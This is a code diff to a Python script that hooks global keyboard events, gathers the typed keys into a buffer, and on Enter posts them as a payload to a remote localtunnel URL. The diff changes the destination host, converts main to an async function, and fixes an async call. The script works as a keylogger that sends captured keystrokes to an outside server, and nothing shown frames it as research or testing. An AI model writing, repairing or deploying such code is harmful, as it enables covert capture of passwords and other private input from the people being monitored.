@@ -18,7 +18,7 @@ async def sendNum(number, url, payload):
 def on_key_event(event):
     if event.event_type == keyboard.KEY_DOWN:
         if event.name == 'enter':
-            send()
+            asyncio.run(send())
         elif event.name == "space":
             cur.append(" ")
         elif event.name == "backspace":
@@ -27,13 +27,14 @@ def on_key_event(event):
             cur.append(event.name)
 
 async def send():
-    url = "https://famous-parrots-remain.loca.lt"
+    url = "https://clever-snakes-worry.loca.lt"
     userInput = "".join(cur)
     payload = {"number": userInput}
     await sendNum(userInput, url, payload)
 
-def main():
-    keyboard.hook(on_key_event)
+async def main():
+    keyboard.on_press(on_key_event)
+    await asyncio.sleep(float('inf'))
 
 if __name__ == "__main__":
     asyncio.run(main())
